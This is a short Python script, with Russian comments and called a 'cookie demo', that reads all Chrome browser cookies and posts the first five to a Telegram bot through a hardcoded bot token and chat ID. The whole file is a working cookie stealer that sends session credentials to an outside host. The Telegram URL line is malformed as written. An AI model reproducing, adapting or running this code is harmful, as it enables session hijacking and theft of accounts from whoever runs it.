import browser_cookie3
import json
import requests
import time

def get_cookies():
    try:
        chrome_cookies = browser_cookie3.chrome()
        cookie_list = []
        for cookie in chrome_cookies:
            cookie_dict = {
                'name': cookie.name,
                'value': cookie.value,
                'domain': cookie.domain,
                'path': cookie.path
            }
            cookie_list.append(cookie_dict)
        return cookie_list
    except Exception as e:
        print(f"Error getting cookies: {str(e)}")
        return []

def send_to_telegram(data):
    # Замените на свой токен бота и chat_id
    bot_token = "7058519736:AAET_AynBBBSxLne2zJPaCtGKhwO-M1NLhg"
    chat_id = "832958135"
    url = f"https://api.telegram.org/bot{7058519736:AAET_AynBBBSxLne2zJPaCtGKhwO-M1NLhg}/sendMessage"
    
    try:
        message = "Cookie Demo Data:\n" + json.dumps(data, indent=4)
        payload = {
            "chat_id": chat_id,
            "text": message
        }
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            print("Data successfully sent to Telegram!")
        else:
            print(f"Failed to send data. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending to Telegram: {str(e)}")

def main():
    print(">>> Starting cookie demo with Telegram...")
    cookies = get_cookies()
    if cookies:
        send_to_telegram(cookies[:5])  # Ограничим до 5 куки
    else:
        print("No cookies to send.")
    time.sleep(2)

if __name__ == "__main__":
    main()